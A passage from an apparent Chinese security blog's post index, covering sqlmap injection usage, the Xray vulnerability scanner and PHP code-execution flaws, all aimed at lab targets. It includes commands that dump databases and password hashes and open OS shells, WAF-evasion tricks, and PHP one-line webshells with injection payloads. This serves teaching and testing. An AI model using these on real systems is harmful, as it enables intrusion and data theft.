&emsp;&emsp;上述代码实现了os-shell得到了命令后，如何执行命令以及输出执行结果到os-shell中。 &emsp;&emsp;因此我们可以在os-shell中执行命令。 3、shell传参进行命令执行 4、删除shell&emsp;&emsp;执行命令删除shell。 四、os-shell的使用条件 数据库用户是dba权限 知道网站的绝对路径 php当中的gpc为off时，php自动转义为关闭状态 就算具备以上3个条件，因为涉及到系统命令，也未必可以执行成功 五、参考链接 https://xz.aliyun.com/t/7942 https://www.cnblogs.com/zzjdbk/p/13951047.html","categories":[{"name":"安全工具/安全开发","slug":"安全工具-安全开发","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://wolke.cn/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"Sqlmap","slug":"Sqlmap","permalink":"https://wolke.cn/tags/Sqlmap/"}],"author":"w01ke"},{"title":"Sqlmap的安装及使用","slug":"Sqlmap的安装及使用","date":"2022-02-14T15:43:26.000Z","updated":"2022-02-14T15:50:27.715Z","comments":true,"path":"post/f2361d57.html","link":"","permalink":"https://wolke.cn/post/f2361d57.html","excerpt":"","text":"一、Sqlmap介绍&emsp;&emsp;Sqlmap是一个自动化的sql注入工具，其主要功能是扫描、发现并利用给定url的SQL注入漏洞，内置了很多绕过插件，支持的数据库是MySQL、Oracle、postgreSQL、Microsoft SQL Server、Microsoft Access、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB &emsp;&emsp;Sqlmap采用了以下5种独特的SQL注入技术 基于布尔类型的盲注，即可以根据返回页面判断条件真假的注入 基于时间的盲注，即不能根据页面返回的内容判断任何信息，要用条件语句查看时间延迟语句是否已执行（即页面返回时间是否增加）来判断 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回到页面中 联合查询注入，在可以使用union的情况下的注入 堆查询注入，可以同时执行多条语句时的注入 &emsp;&emsp;Sqlmap的强大功能包括数据库指纹识别、数据库枚举、数据库提取、访问目标文件系统，并在获取完全的操作权限时实行任意命令。Sqlmap的功能强大到让人惊叹，当常规的注入工具不能利用SQL注入漏洞进行注入时，使用sqlmap会有意想不到的效果 二、安装步骤 首先安装python，并配置好环境变量（D:\\python3.8） 官网下载sqlmap并解压，我将解压后的文件夹命名为sqlmap 将sqlmap拷贝到python目录下 配置sqlmap的环境变量（D:\\python3.8\\sqlmap) 打开命令行，输入sqlmap.py即可 三、Sqlmap入门1、判断是否存在注入&emsp;&emsp;拿到一个站点，首先得判断它是否有注入 &emsp;&emsp;假定注入点是http://127.0.0.1/sql/Less-1/?id=1，判断其是否存在注入的命令如下： Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 &emsp;&emsp;嫌麻烦输入y，可以加个–batch，所有都默认 &emsp;&emsp;-u或--url指定目标 &emsp;&emsp;显示结果如图所示 &emsp;&emsp;还有一种情况，当注入点后面的参数大于等于两个时，需要加双引号，如下所示 Sqlmap.py -u &quot;http://127.0.0.1/sql/Less-1/?id=1&amp;uid=2&quot; 2、判断文本中的请求是否存在注入&emsp;&emsp;从文件中加载HTTP请求，sqlmap可以从一个文本文档中获取HTTP请求，这样就可以不设置其他参数（如cookie，POST数据等等），txt文件中的内容为web数据包（一般可以使用burp抓包），如下图所示 &emsp;&emsp;判断是否存在注入的命令如下图所示，运行后的结果如图所示 Sqlmap.py -r C:\\Users\\win7\\Desktop\\123.txt &emsp;&emsp;-r从文件加载HTTP请求 3、查询当前用户下的所有数据库&emsp;&emsp;该命令是确定网站存在注入后，用户查询当前用户下所有的数据库，如下所示。如果当前用户有权限读取包含所有数据库列表信息的表，使用该命令就可以列出所有数据库，如图所示 Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --dbs 4、获取数据库中的表名&emsp;&emsp;该命令的作用是查询完数据库后，查询指定数据库中的所有的表名，如下所示。如果在该命令中不加入-D参数来指定某一个具体的数据库，那么sqlmap会列出数据库中所有的表，如图所示： Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security --tables &emsp;&emsp;-D DB，要进行枚举的数据库名 5、获取表中的字段名&emsp;&emsp;该命令的作用是查询完表名后，查询该表中所有的字段名，如下所示。运行该命令的结果如图所示： Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security -T users --columns &emsp;&emsp;-T TBL，要进行枚举的数据库表 &emsp;&emsp;--columns枚举DBMS数据库表列 6、获取字段内容&emsp;&emsp;该命令的作用是查询完字段名之后，获取该字体中具体的数据信息，如下所示。运行该命令的结果如图所示： Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 -D security -T users -C id,password,username --dump &emsp;&emsp;-C COL，要进行枚举的数据库列 &emsp;&emsp;--dump 转储数据库管理系统的数据库中的表项 7、获取数据库中所有的用户&emsp;&emsp;该命令的作用是列出所有数据库的所有用户，如下所示。在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户，运行该命令的结果如图所示： Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --users &emsp;&emsp;--users 枚举数据库管理系统用户 8、获取数据库用户的密码&emsp;&emsp;该命令的作用是列出所有数据库的用户的密码，如下所示。如果当前用户有读取包含用户密码的权限，sqlmap会先列举出用户，然后列出Hash，并尝试破解，运行该命令的结果如图所示： Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --passwords &emsp;&emsp;--passwords 枚举数据库管理系统用户密码哈希 9、获取当前网站数据库的名称&emsp;&emsp;该命令的作用是列出当前网站使用的数据库，如下所示，运行该命令的结果如图所示： Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --current-db &emsp;&emsp;--current-db 检索数据库管理系统当前数据库 10、获取当前网站数据库的用户&emsp;&emsp;该命令的作用是列出当前网站使用的数据库用户，如下所示，运行该命令的结果如图所示： Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --current-user &emsp;&emsp;--current-user 检索数据库管理系统的标识 11、报错注入(error based)&emsp;&emsp;无法发现报错位，但是数据库出错会爆出来 sqlmap -u [目标url] --current-db --batch --threads 10 --technique E 12、布尔型注入 (boolen based)&emsp;&emsp;无法发现报错位，数据库被破坏也无法爆出来，但是界面上只会出现有和没有东西两种情况 sqlmap -u [目标url] --current-db --batch --threads 10 --technique B 13、布尔型时间盲注 (time based)sqlmap -u [目标url] --current-db --batch --threads 10 --technique T -v 3 14、标准注入（standard based）sqlmap -u [目标url] --current-db --batch --threads 10 --technique S 15、联合注入（union based）sqlmap -u [目标url] --dbs --batch --threads 10 --technique U 16、POST方面注入&emsp;&emsp;--data 后面跟的是post的数据；*号标哪，就是让sqlmap打哪 sqlmap -u [目标url] --data &quot;uname=admin*&amp;passwd=admin&amp;submit=Submit&quot; --current-db --batch --threads 10 --technique E 17、请求头注入&emsp;&emsp;在使用请求头注入的时候，–level必须大于3 sqlmap -u [目标url] --user-agent=&quot;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0*&quot; --level 4 --dbs --threads 10 --batch --technique E &emsp;&emsp;或者使用burp抓包，copy to file保存为shuju.txt，打开文件，在要注入的地方打*，然后 sqlmap -r &quot;root/shuju.txt&quot; --dbs --threads 10 --batch --technique Esqlmap -u http://sqlilabs.njhack.xyz/Less-20/ --cookie=&quot;uname = admin*;__cfduid=dab97c3dd6a54c5ca485d3e880af5ce271605180690&quot; --level 4 --dbs --threads 10 --batch --technique E 四、sqlmap进阶1、–level 5：探测等级&emsp;&emsp;参数--level 5指需要执行的测试等级，一共有5个等级（1-5），可以用不同level，默认是1。 &emsp;&emsp;Sqlmap使用的payload可以在xml/payload.xml中可以看到，也可以根据相应的格式添加自己的payload，其中5级包含的payload最多，会自动破解出cookie、xff等头部注入。当然，level 5的运行速度也比较慢。 &emsp;&emsp;这个参数会影响测试的注入点，get和post的数据都会进行测试，http cookie在level为2的时候就会测试，http user-agent/referer头在level为3的时候就会进行测试。总之，在不确定那个payload或者参数注入点时，为了保证全面性，为了保证全面性，建议使用高的level值 2、–is-dba：当前用户是否为管理权限&emsp;&emsp;该命令用户查看当前账户是否为数据库管理员账户，检测DBMS当前用户是否DBA。如下所示，在本案例中输入该命令，会返回true，结果如图所示： Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --is-dba 3、–roles：列出数据库管理员的角色&emsp;&emsp;该命令用户查看数据库用户的角色，枚举数据库管理系统用户的角色。如果当前用户有权限读取包含所有用户的表，输入该命令会列举出每个用户的角色，也可以用**-U**参数(-U USER，用来进行枚举的数据库用户 )指定想看哪个用户的角色，结果如图所示： Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --roles 4、–referer：HTTP Referer头&emsp;&emsp;Sqlmap可以在请求中伪造http中的referer，当level参数设定为3或者3以上时，会尝试对referer头注入。可以使用referer命令来欺骗。如： Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --referer http://www.baidu.com &emsp;&emsp;HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。 5、sql-shell：运行自定义sql语句&emsp;&emsp;该命令用户执行指定的SQL语句，如下所示，假设执行select * from users limit 0,1 语句 Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --sql-shell 6、–os-cmd，–os-shell：运行任意操作系统命令&emsp;&emsp;该命令用户执行任意操作系统命令，如下所示 Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --os-shell &emsp;&emsp;对于MySQL来说，实际上是写入两个文件，一个是上传文件的，一个是执行命令的，具体可以参考这篇文章：https://xz.aliyun.com/t/7942 &emsp;&emsp;请特别注意：使用该命令有几个必须具备的条件 数据库用户是dba权限 知道网站的绝对路径 php当中的gpc为off时，php自动转义为关闭状态 就算具备以上3个条件，因为涉及到系统命令，也未必可以执行成功 7、–file-read：从数据库服务器中读取文件&emsp;&emsp;该命令用于读取执行文件 Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --file-read &quot;要读取的文件路径&quot; 8、–file-write，–file-dest：上传文件到数据库服务器中&emsp;&emsp;该命令用于上传文件 Sqlmap.py -u http://127.0.0.1/sql/Less-1/?id=1 --file-write &quot;上传文件路径(相对路径)&quot; --file-dest &quot;目标文件系统绝对路径&quot; 9、–proxy&emsp;&emsp;当遇到网站开启了流量检测，检测同一个IP的在某一时间的请求总数，我们可以使用代理池来绕过检测 10、–user-agent&emsp;&emsp;可以伪造User-Agent，因为Sqlmap自带的User-Agent是带有Sqlmap的指纹信息的，因此可以指定User-Agent防止被检测到是Sqlmap而被拦截 &emsp;&emsp;比如这里使用burp抓包，可以看到有Sqlmap的指纹信息 &emsp;&emsp;只要更改了代理就可以除去Sqlmap的指纹信息，绕过Waf的工具检测 &emsp;&emsp;某网站开启了流量防护，但是如果网站开启了如果网站Waf设置了爬虫白名单，那么我们可以伪装成搜索引擎的User-Agent来进行绕过 sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --proxy=&quot;http://127.0.0.1:8888&quot; --user-agent=&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)&quot; 11、–random-agent&emsp;&emsp;随机指定代理 &emsp;&emsp;可以在这里添加代理 12、–delay 延时&emsp;&emsp;每个HTTP请求之间的延迟（秒） &emsp;&emsp;当网站开启了CC流量防护等措施防止大量流量攻击时，我们可以使用--delay参数来减缓我们的请求速度 sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --user-agent=&quot;Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)&quot; --delay=1","categories":[{"name":"安全工具/安全开发","slug":"安全工具-安全开发","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"https://wolke.cn/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"Sqlmap","slug":"Sqlmap","permalink":"https://wolke.cn/tags/Sqlmap/"}],"author":"w01ke"},{"title":"Xray：一款自动化Web漏洞扫描神器","slug":"Xray：一款自动化Web漏洞扫描神器","date":"2022-02-14T14:42:37.000Z","updated":"2022-02-14T15:04:29.437Z","comments":true,"path":"post/60ade18e.html","link":"","permalink":"https://wolke.cn/post/60ade18e.html","excerpt":"","text":"一、Xray简介&emsp;&emsp;xray 是从长亭洞鉴核心引擎中提取出的社区版漏洞扫描神器，支持主动、被动多种扫描方式，自备盲打平台、可以灵活定义 POC，功能丰富，调用简单，支持 Windows、macOS、Linux 多种操作系统，可以满足广大安全从业者的自动化 Web 漏洞探测需求。 Github地址：https://github.com/chaitin/xray 二、特色 使用 go 语言编写，跨平台、纯异步、无阻塞，并发能力强，扫描速度杠杠的 提供多种使用方式，调用姿势方便，输入输出非常标准化，极具可集成性 使用 YAML 配置文件非常方便地定义 POC，可以快速扩展扫描能力 全程使用无害 POC 进行探测，在确保能发现漏洞的基础上不会给业务带来严重影响，非常适用于企业内部安全建设 命令行式的免费被动扫描工具，不多见 自备盲打平台，可检测需要反连才能触发的漏洞，如：存储型 XSS、无回显的 SSRF、XXE、命令注入等 更新速度快，用着不爽可以在 github 提需求，很快就能解决（我试过了，是真的） 三、使用人群 白帽子。挖 SRC 必备，打开浏览器挂上代理，然后上网冲浪等漏洞就对了，还不够的话就把代理给你爸妈、给你妹子、给你家猫都挂上 甲方安全建设者。工具在手，天下我有，细粒度配置，高精度扫描，可作为定期巡检、常规扫描的辅助神器 乙方工具开发者。在编写渗透框架或者漏洞扫描框架时，作为扫描探针进行集成，简直是大平台中的小尖刀 四、基于代理的被动扫描&emsp;&emsp;代理模式下的基本架构为，扫描器作为中间人，首先原样转发流量，并返回服务器响应给浏览器等客户端，通讯两端都认为自己直接与对方对话，同时记录该流量，然后修改参数并重新发送请求进行扫描。这种原理和 Burpsuite 的自带的漏扫原理是一样的。 1、生成CA证书&emsp;&emsp;需要注意一下的是，很多时候还会扫到 HTTPS 站点，可能会因为有代理而导致无法访问，或者需要手动确认安全风险。这时候需要我们导入 xray 运行目录下的 ca.crt 证书，关于如何导入 CA 证书，请打开百度搜索 “安装CA证书”。 &emsp;&emsp;在浏览器使用 https 协议通信的情况下，必须要得到客户端的信任，才能建立与客户端的通信。 &emsp;&emsp;这里的突破口就是 ca 证书。只要自定义的 ca 证书得到了客户端的信任，xray 就能用该 ca 证书签发各种伪造的服务器证书，从而获取到通信内容。 【Windows】.\\xray_windows_amd64.exe genca【Linux】./xray_linux_amd64 genca &emsp;&emsp;运行命令之后，将在当前文件夹生成 ca.crt 和 ca.key 两个文件。 &emsp;&emsp;本命令只需要第一次使用的时候运行即可，如果文件已经存在再次运行会报错，需要先删除本地的 ca.crt 和 ca.key 文件。 2、安装CA证书（1）Firefox&emsp;&emsp;如果使用的是 FireFox 浏览器，它有自己的证书体系。 （2）其他&emsp;&emsp;如果使用的是 IE、Chrome、curl 等客户端，建议将 ca 证书安装在操作系统上，请根据不同的操作系统，选择参照下方的教程。 ① Windows&emsp;&emsp;双击 ca.crt，然后按照下图的步骤操作。 ② Linux&emsp;&emsp;将 ca.crt 复制到 /usr/local/share/ca-certificates/，然后执行 update-ca-certificates。 sudo cp ca.crt /usr/local/share/ca-certificates/xray.crtsudo update-ca-certificates ③ MacOS&emsp;&emsp;双击 ca.crt，然后按照下图的步骤操作。 &emsp;&emsp;右上角搜索 x-ray，可以看到一条记录，有一个红叉，被标记为不受信任的。 &emsp;&emsp;然后双击这条记录，将 SSL 那一项改为始终信任，然后点击左上角关闭窗口，输入密码授权。 ④ Android&emsp;&emsp;可以将 ca.crt 文件传送到手机上，然后打开 &emsp;&emsp;或者参考下面的步骤，将手机配置代理之后，使用浏览器访问 http://xray/ 然后点击下载 ca 证书，然后再安装。 ⑤ IOS&emsp;&emsp;可以将 ca.crt 文件传送到手机上，然后点击打开打开。 &emsp;&emsp;或者参考后续的步骤，将手机配置代理之后，使用浏览器访问 http://xray/ 然后点击下载 ca 证书，然后再安装。 &emsp;&emsp;然后去设置首页，查看下载的描述文件。 &emsp;&emsp;点击右上角安装，输入密码授权。 &emsp;&emsp;点击通用设置-关于，在最后一项证书信任设置中，将 Insecure Root CA For X-Ray Scanner 一项的开关打开。 3、启动代理&emsp;&emsp;在扫描之前，我们还需要做一些必要的设置 &emsp;&emsp;第一次启动 xray 之后，当前目录会生成 config.yml 文件，选择文件编辑器打开，并按照下方说明修改。（这里我就不改了） mitm: ... restriction: hostname_allowed: # 允许访问的 Hostname，支持格式如 t.com、*.t.com、1.1.1.1、1.1.1.1/24、1.1-4.1.1-8 - testphp.vulnweb.com &emsp;&emsp;因为我们的测试目标站就是 http://testphp.vulnweb.com，增加这个过滤之后，xray 将只会扫描该站的流量，避免扫描到非授权目标站点。 设定漏洞扫描结果的输出，这里选择使用 html 文件输出，所以命令行后面要增加 --html-output xray-testphp.html。 --text-output：输出到文本文件中--json-output：输出到JSON文件中--html-output：输出到HTML文件中 xray 配置文件中默认不允许扫描 gov 和 edu 等网站，如果想对这些网站进行授权测试，需要移除 hostname_disallowed 的相关配置才可以。严禁未授权的测试！否则后果自负。 ./xray_linux_amd64 webscan --listen 127.0.0.1:7777 --html-output xray-testphp.html 【常见问题】 如何退出？ctrl + c 提示 file xray-testphp.html already exists，可以删除已经存在的报告文件，或者使用一个新的文件名，或者在文件名中加入 __timestamp__ 或 __datetime__ 将自动替换为实际值。 4、配置代理（1）Edge&emsp;&emsp;按照下图的步骤操作 （2）Chrome&emsp;&emsp;Chrome 可以使用操作系统的代理配置，同时也可以使用插件控制，这里推荐使用插件，可以更加灵活的去配置代理。 &emsp;&emsp;首先点击 Chrome Store &emsp;&emsp;然后点击同意相关的协议和权限申请弹框，这样就可以在 Chrome 浏览器的右上角看到一个圆形图标的插件了。 &emsp;&emsp;新建情景模式，命名为 xray，然后 todo todo &emsp;&emsp;选择 xray 模式，这样 Chrome 就会使用 xray 作为代理了。 （3）Firefox&emsp;&emsp;不再赘述 （4）IOS&emsp;&emsp;按照下图的步骤操作 （5）Android&emsp;&emsp;不再赘述 5、开始扫描&emsp;&emsp;使用浏览器访问自己的pikachu靶场，然后就可以看到 xray 界面开始输出漏洞信息 五、使用xray基础爬虫模式进行漏洞扫描&emsp;&emsp;爬虫模式是模拟人工去点击网页的链接，然后去分析扫描，和代理模式不同的是，爬虫不需要人工的介入，访问速度要快很多，但是也有一些缺点需要注意 xray 的基础爬虫不能处理 js 渲染的页面，如果需要此功能，请参考 版本对比 1、启动爬虫./xray_linux_amd64 webscan --basic-crawler http://testphp.vulnweb.com/ --html-output xray-crawler-testphp.html 这可能是最简单最常用的一个功能，就是太长了，体验不太友好，建议常用的同学可以 alias xray=&quot;/path/xray webscan --basic-crawler&quot; &emsp;&emsp;比如对pikachu靶场中的XSS进行扫描 2、登录后的网站扫描&emsp;&emsp;如果用的是代理模式，只要浏览器是登录状态，那么漏洞扫描收到的请求也都是登录状态的请求。但对于普通爬虫而言，就没有这么“自动化”了， 但是可以通过配置 Cookie 的方式实现登录后的扫描。 &emsp;&emsp;打开配置文件，修改 http 配置部分的 Headers 项： http: headers: Cookie: key=value &emsp;&emsp;上述配置将为所有请求（包括爬虫和漏洞扫描）增加一条 Cookie key=value 六、使用xray进行服务扫描&emsp;&emsp;xray 中最常见的是 web 扫描，但是 xray 将会逐渐开放服务扫描的相关能力，目前主要是服务扫描相关的 poc。老版本升级的用户请注意配置文件需要加入服务扫描的相关 poc 名字，目前只有一个 tomcat-cve-2020-1938 ajp 协议任意文件检测 poc。 &emsp;&emsp;参数配置目前比较简单，输入支持两种方式，例如： 快速检测单个目标./xray servicescan --target 127.0.0.1:8009批量检查的 1.file 中的目标, 一行一个目标，带端口./xray servicescan --target-file 1.file &emsp;&emsp;其中 1.file 的格式为一个行一个 service，如 10.3.0.203:8009127.0.0.1:8009 &emsp;&emsp;也可以将结果输出到报告或json文件中 将检测结果输出到 html 报告中./xray servicescan --target 127.0.0.1:8009 --html-output service.html./xray servicescan --target-file 1.file --html-output service.html将检测结果输出到 json 文件中./xray servicescan --target 127.0.0.1:8099 --json-output 1.json NAME: servicescan - Run a service scan taskUSAGE: servicescan [command options] [arguments...]OPTIONS: --target value specify the target, for example: host:8009 --target-file value load targets from a local file, one target a line --json-output FILE output xray results to FILE in json format --html-output FILE output xray result to `FILE` in HTML format &emsp;&emsp;以 tomcat CVE-2020-1938 ajp 协议任意文件读取为例，命令行如下图。 七、高级用法1、启用部分扫描插件&emsp;&emsp;使用 --plugins 参数可以选择仅启用部分扫描插件，多个插件之间可使用逗号分隔，如： ./xray webscan --plugins cmd_injection --url http://example.com/ &emsp;&emsp;目前提供的插件列表如下： [+] SQL 注入检测 (key: sqldet)：支持报错注入、布尔注入和时间盲注等XSS 检测（key: xss）[+] 支持扫描反射型、存储型 XSS命令/代码注入检测 (key: cmd_injection)[+] 支持 shell 命令注入、PHP 代码执行、模板注入等目录枚举 (key: dirscan)[+] 检测备份文件、临时文件、debug 页面、配置文件等10余类敏感路径和文件路径穿越检测 (key: path_traversal)[+] 支持常见平台和编码XML 实体注入检测 (key: xxe)[+] 支持有回显和反连平台检测POC 管理 (key: phantasm)[+] 默认内置部分常用的 POC，用户可以根据需要自行构建 POC 并运行。可参考：POC 编写文档文件上传检测 (key: upload)[+] 支持检测常见的后端服务器语言的上传漏洞弱口令检测 (key: brute_force)[+] 支持检测 HTTP 基础认证和简易表单弱口令，内置常见用户名和密码字典JSONP 检测 (key: jsonp)[+] 检测包含敏感信息可以被跨域读取的 jsonp 接口SSRF 检测 (key: ssrf)[+] ssrf 检测模块，支持常见的绕过技术和反连平台检测基线检查 (key: baseline)[+] 检测低 SSL 版本、缺失的或错误添加的 http 头等任意跳转检测 (key: redirect)[+] 支持 HTML meta 跳转、30x 跳转等CRLF 注入 (key: crlf_injection)[+] 检测 HTTP 头注入，支持 query、body 等位置的参数 2、只扫描一个URL&emsp;&emsp;xray 还提供了方便的只扫描一个 URL 的方式，如： ./xray webscan --url http://example.com/ --json-output out.json 3、配置文件&emsp;&emsp;xray 还提供了友好配置文件，可以方便地将常用的命令行参数写到配置文件中，避免了每次都要输入一大串参数的痛苦。 &emsp;&emsp;xray 默认会读取运行目录下的 config.yaml 文件作为配置文件，也可以使用 --config 参数指定其他配置文件。 &emsp;&emsp;关于命令行的详细配置可以参考 xray 官方文档。 4、反连平台&emsp;&emsp;xray 在运行时会自动启动反连平台来辅助盲打扫描，可以在配置文件中修改反连平台的配置。目前支持 http 和 dns 两种反连机制，当服务端触发 payload 时 xray 会根据反连平台的状态判断漏洞是否存在。 dns 反连需要启用 root 权限监听 53 端口，并且将域名的 ns 记录指向反连平台的监听地址 5、自定义POC&emsp;&emsp;xray 支持用户使用 YAML 编写 POC。YAML 是JSON 的超集，也就是说我们甚至可以用 JSON 编写 POC，但这里还是建议大家使用 YAML 来编写，原因如下： [+] YAML 格式的 “值” 无需使用双引号包裹，特殊字符无需转义[+] YAML 格式使内容更加可读[+] YAML 中可以使用注释 &emsp;&emsp;我们可以编写以下的 yaml 来测试 tomcat put 上传任意文件漏洞： name: poc-yaml-tomcat_putrules: - method: PUT path: /hello.jsp body: world - method: GET path: /hello.jsp search: world &emsp;&emsp;这里还要感谢 phith0n 贡献的 xray PoC 生成器，虽然丑陋，但不失文雅。 &emsp;&emsp;将 POC 保存到 YAML 文件后使用 --poc 参数可以方便地调用，如： ./xray webscan --plugins phantasm --poc /home/test/poc.yaml --url http://example.com/ 八、使用场景1、与BurpSuite联动&emsp;&emsp;在实际测试过程中，除了被动扫描，也时常需要手工测试。这里使用 Burp 的原生功能与 xray 建立起一个多层代理，让流量从 Burp 转发到 xray 中。 &emsp;&emsp;首先 xray 建立起 webscan 的监听 &emsp;&emsp;进入 Burp 后，打开 User options 标签页，然后找到 Upstream Proxy Servers 设置。 &emsp;&emsp;点击 Add 添加上游代理以及作用域，Destination host处可以使用 * 匹配多个任意字符串，? 匹配单一任意字符串，而上游代理的地址则填写 xray 的监听地址。 &emsp;&emsp;接下来，在浏览器端使用 Burp 的代理地址 &emsp;&emsp;此时，请求已经通过了 Burp","categories":[{"name":"安全工具/安全开发","slug":"安全工具-安全开发","permalink":"https://wolke.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"Xray","slug":"Xray","permalink":"https://wolke.cn/tags/Xray/"},{"name":"漏洞扫描","slug":"漏洞扫描","permalink":"https://wolke.cn/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"}],"author":"w01ke"},{"title":"RCE代码及命令执行漏洞","slug":"RCE代码及命令执行漏洞","date":"2022-02-13T09:26:53.000Z","updated":"2022-02-15T16:39:55.997Z","comments":true,"path":"post/aa4ddb75.html","link":"","permalink":"https://wolke.cn/post/aa4ddb75.html","excerpt":"","text":"&emsp;&emsp;在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用 代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。 一、代码执行1、脚本（1）PHP&emsp;&emsp;PHP中可以执行代码的函数，常用于编写一句话木马，可能导致代码执行漏洞，这里对代码执行函数做一些归纳。 &emsp;&emsp;常见代码执行函数，如 eval()、assert()、preg_replace()、create_function()array_map()、call_user_func()、call_user_func_array()，array_filter，usort，uasort()文件操作函数、动态函数（$a($b)） a、eval()&emsp;&emsp;eval()函数把字符串按照 PHP 代码来计算，如常见的一句话后门程序： &lt;?php eval($_POST[cmd]);?&gt; b、assert()&emsp;&emsp;与eval类似，字符串被 assert() 当做 PHP 代码来执行，如： &lt;?php //?cmd=phpinfo()assert($_REQUEST[cmd]); ?&gt; c、preg_replace&emsp;&emsp;语法：mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) &emsp;&emsp;搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。 &emsp;&emsp;参数说明： [+] $pattern: 要搜索的模式，可以是字符串或一个字符串数组。[+] $replacement: 用于替换的字符串或字符串数组。[+] $subject: 要搜索替换的目标字符串或字符串数组。[+] $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。[+] $count: 可选，为替换执行的次数。 &emsp;&emsp;返回值：如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。 如果匹配被查找到，替换后的 subject 被返回，其他情况下返回没有改变的 subject。如果发生错误，返回 NULL。 &emsp;&emsp;危险点：preg_replace()函数原本是执行一个正则表达式的搜索和替换，但因为存在危险的/e修饰符，使 preg_replace() 将 replacement 参数当作 PHP 代码 &emsp;&emsp;示例代码： &lt;?php //?cmd=phpinfo()@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abcd&quot;);?&gt; d、create_function()&emsp;&emsp;语法：string create_function(string $args, string $code) string $args 变量部分string $code 方法代码部分 &emsp;&emsp;举例： create_function(&#x27;$fname&#x27;,&#x27;echo $fname.&quot;Zhang&quot;&#x27;) &emsp;&emsp;类似于： function fT($fname) &#123; echo $fname.&quot;Zhang&quot;;&#125; &emsp;&emsp;举一个官方提供的例子： &lt;?php$newfunc = create_function(&#x27;$a,$b&#x27;, &#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;);echo &quot;New anonymous function: $newfunc&quot;;echo $newfunc(2, M_E) . &quot;&quot;;// outputs// New anonymous function: lambda_1// ln(2) + ln(2.718281828459) = 1.6931471805599?&gt; &emsp;&emsp;create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给create_function()执行任意命令。 &emsp;&emsp;现在利用create_function()实现代码注入 &emsp;&emsp;测试环境版本：apache +php 5.2、apache +php 5.3 &emsp;&emsp;有问题的代码 &lt;?php//index.php?id=2;&#125;phpinfo();/*$id=$_GET[&#x27;id&#x27;];$str2=&#x27;echo &#x27;.$a.&#x27;test&#x27;.$id.&quot;;&quot;;echo $str2;echo &quot;&lt;br/&gt;&quot;;echo &quot;==============================&quot;;echo &quot;&lt;br/&gt;&quot;;$f1 = create_function(&#x27;$a&#x27;,$str2);echo &quot;&lt;br/&gt;&quot;;echo &quot;==============================&quot;;?&gt; &emsp;&emsp;利用方法：index.php?id=2;&#125;phpinfo();/* &emsp;&emsp;实现原理： 由于id= 2;&#125;phpinfo();/*执行函数为：源代码：function fT($a) &#123; echo &quot;test&quot;.$a;&#125;注入后代码：function fT($a) &#123; echo &quot;test&quot;;&#125; phpinfo();/*;//此处为注入代码。&#125; e、array_map&emsp;&emsp;array_map()函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给array_map()函数的数组数目一致。 &emsp;&emsp;代码示例： &lt;?php//?func=system&amp;cmd=whoami$func=$_GET[&#x27;func&#x27;];$cmd=$_GET[&#x27;cmd&#x27;];$array[0]=$cmd;$new_array=array_map($func,$array);//print_r($new_array);?&gt; f、call_user_func()/call_user_func_array ()&emsp;&emsp;call_user_func——把第一个参数作为回调函数调用，其余参数是回调函数的参数。 &emsp;&emsp;call_user_func_array——调用回调函数，并把一个数组参数作为回调函数的参数 &lt;?php //?cmd=phpinfo()@call_user_func(assert,$_GET[&#x27;cmd&#x27;]);?&gt;&lt;?php 